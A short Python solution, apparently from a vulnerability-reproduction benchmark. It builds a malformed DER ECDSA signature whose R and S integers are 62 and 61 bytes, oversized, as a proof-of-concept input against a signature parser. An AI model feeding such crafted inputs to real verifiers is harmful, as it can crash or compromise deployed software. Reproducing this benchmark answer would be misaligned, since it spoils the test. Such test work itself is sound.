import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a DER-encoded ECDSA signature with oversized R and S integers.
        # SEQUENCE {
        #   INTEGER R (62 bytes)
        #   INTEGER S (61 bytes)
        # }
        r_len = 62
        s_len = 61
        seq_len = 2 + r_len + 2 + s_len  # total length of the two INTEGERs
        # Ensure sequence length fits in single-byte short-form length (< 128)
        assert seq_len == 127

        sig = bytearray()
        # SEQUENCE tag and length
        sig.append(0x30)        # SEQUENCE
        sig.append(seq_len)     # length of the content

        # INTEGER R
        sig.append(0x02)        # INTEGER
        sig.append(r_len)       # length of R
        sig.extend(b'\x01' * r_len)  # R value bytes

        # INTEGER S
        sig.append(0x02)        # INTEGER
        sig.append(s_len)       # length of S
        sig.extend(b'\x01' * s_len)  # S value bytes

        # Sanity check: total length should match header
        assert len(sig) == 2 + seq_len

        return bytes(sig)